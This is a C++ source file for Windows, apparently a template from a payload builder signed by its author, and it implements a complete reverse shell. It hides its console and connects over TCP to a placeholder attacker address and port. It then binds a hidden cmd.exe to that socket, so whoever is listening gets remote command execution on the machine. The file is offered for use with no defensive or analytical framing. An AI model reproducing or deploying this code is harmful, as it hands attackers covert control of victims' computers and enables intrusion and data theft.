// Coded by K3rnel-dev
// Git:github.com/K3rnel-dev
// Enjoy :D
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in R;
STARTUPINFOW A;
PROCESS_INFORMATION B;

const char* IP_ADDRESS = "IPADDRSELECT";
const int PORT = PORTSELECT;

int main() {
    FreeConsole();

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    R.sin_family = AF_INET;
    R.sin_port = htons(PORT);
    R.sin_addr.s_addr = inet_addr(IP_ADDRESS);
    
    WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
    memset(&A, 0, sizeof(A));
    A.cb = sizeof(A);
    A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;

    wchar_t c[256] = L"cmd.exe";

    CreateProcessW(NULL, c, 0, 0, TRUE, CREATE_NO_WINDOW, 0, 0, &A, &B);

    return 0;
}

